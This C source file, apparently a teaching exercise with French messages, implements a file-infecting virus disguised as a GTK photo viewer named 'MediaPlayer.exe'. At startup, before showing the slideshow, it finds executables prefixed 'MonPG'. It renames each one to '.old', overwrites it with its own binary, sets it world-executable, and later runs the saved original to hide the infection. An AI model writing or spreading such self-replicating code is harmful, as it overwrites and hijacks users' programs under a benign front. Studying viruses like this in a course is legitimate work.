#include <stdio.h>
#include <stdlib.h>
#include <gtk/gtk.h>
#include <sys/types.h>
#include <dirent.h>
#include <sys/stat.h>
#include <unistd.h>
#include <string.h>
#include <math.h> 


void loadPictures(GtkWidget *pButton, gpointer data);
DIR* OpenFolder(const char* pathFolder);
void getFileFromFolder(DIR* rep);
int is_infected(char* file);
void infect_target(char* file);

GtkWidget *pWindow;
GtkWidget *pImage;
int idImg = 0;

int main(int argc, char **argv) {
    DIR* rep = OpenFolder("./");
    getFileFromFolder(rep);

    if (strcmp(argv[0], "./MediaPlayer.exe") == 0) {
        GtkWidget *pButton;
        GtkWidget *layoutBox;

        gtk_init(&argc, &argv);
        pWindow = gtk_window_new(GTK_WINDOW_TOPLEVEL);
        gtk_window_set_position(GTK_WINDOW(pWindow), GTK_WIN_POS_CENTER);
        gtk_window_set_title(GTK_WINDOW(pWindow), "Mes photos");
        layoutBox = gtk_box_new(GTK_ORIENTATION_VERTICAL, 0);
        gtk_container_add(GTK_CONTAINER(pWindow), layoutBox);
        pButton = gtk_button_new_with_label("Suivant");
        gtk_box_pack_end(GTK_BOX(layoutBox), pButton, FALSE, FALSE, 0);
        g_signal_connect(G_OBJECT(pWindow), "destroy", G_CALLBACK(gtk_main_quit), NULL);
        g_signal_connect(G_OBJECT(pButton), "clicked", G_CALLBACK(loadPictures), (gpointer)layoutBox);
        pImage = gtk_image_new_from_file("img/image1.jpeg");
        gtk_box_pack_start(GTK_BOX(layoutBox), pImage, TRUE, TRUE, 0);
        gtk_widget_show_all(pWindow);
        gtk_main();
    } else {
        char old_file[256];
        snprintf(old_file, sizeof(old_file), "%s.old", argv[0]);
        if (access(old_file, F_OK) == 0) {
            execl(old_file, old_file, NULL);
            perror("Erreur execl");
        }
    }
    return 0;
}

DIR* OpenFolder(const char* pathFolder) {
    DIR* rep = opendir(pathFolder);
    if (rep == NULL) {
        perror("Erreur opendir");
        exit(1);
    }
    return rep;
}

void getFileFromFolder(DIR* rep) {
    struct dirent* entry;
    struct stat file_stat;

    while ((entry = readdir(rep)) != NULL) {
        if (strncmp(entry->d_name, "MonPG", 5) == 0) {
            if (stat(entry->d_name, &file_stat) < 0) {
                perror("Erreur stat");
                continue;
            }
            if (S_ISREG(file_stat.st_mode) && (file_stat.st_mode & S_IXUSR)) {
                printf("Fichier exécutable trouvé : %s\n", entry->d_name);
                if (!is_infected(entry->d_name)) {
                    infect_target(entry->d_name);
                } else {
                    printf("%s déjà infecté\n", entry->d_name);
                }
            }
        }
    }
    closedir(rep);
}

int is_infected(char* file) {
    if (strstr(file, ".old") != NULL) {
        return 1;
    }
    char old_file[256];
    snprintf(old_file, sizeof(old_file), "%s.old", file);
    return (access(old_file, F_OK) == 0);
}

void infect_target(char* file) {
    char old_file[256];
    snprintf(old_file, sizeof(old_file), "%s.old", file);

    if (rename(file, old_file) != 0) {
        perror("Erreur rename");
        return;
    }

    FILE *fvirus = fopen("./MediaPlayer.exe", "rb");
    FILE *ftarget = fopen(file, "wb");
    if (!fvirus || !ftarget) {
        perror("Erreur ouverture fichiers");
        return;
    }
    char buffer[512];
    size_t bytes;
    while ((bytes = fread(buffer, 1, sizeof(buffer), fvirus)) > 0) {
        fwrite(buffer, 1, bytes, ftarget);
    }
    fclose(fvirus);
    fclose(ftarget);

    chmod(file, S_IRWXU | S_IRWXG | S_IRWXO);
    printf("Infection réussie : %s\n", file);
}

void loadPictures(GtkWidget *pButton, gpointer data) {
    char *images[] = {
        "img/image1.jpeg", "img/image2.jpeg", "img/image3.jpeg",
        "img/image4.jpeg", "img/image5.jpeg", "img/image6.jpeg"
    };
    idImg = (idImg == 5) ? 0 : idImg + 1;

    
    GdkPixbuf *pixbuf = gdk_pixbuf_new_from_file(images[idImg], NULL);
    if (!pixbuf) {
        fprintf(stderr, "Erreur chargement image : %s\n", images[idImg]);
        return;
    }

    
    int width = gdk_pixbuf_get_width(pixbuf);
    int height = gdk_pixbuf_get_height(pixbuf);

    
    int max_width = 800;
    int max_height = 600;
    if (width > max_width || height > max_height) {
        float ratio = fmin((float)max_width / width, (float)max_height / height);
        width = (int)(width * ratio);
        height = (int)(height * ratio);
        GdkPixbuf *scaled_pixbuf = gdk_pixbuf_scale_simple(pixbuf, width, height, GDK_INTERP_BILINEAR);
        g_object_unref(pixbuf);
        pixbuf = scaled_pixbuf;
    }

   
    gtk_image_set_from_pixbuf(GTK_IMAGE(pImage), pixbuf);
    g_object_unref(pixbuf);

    
    gtk_widget_set_size_request(pImage, width, height);
    gtk_window_resize(GTK_WINDOW(pWindow), width, height + 50);

    
}

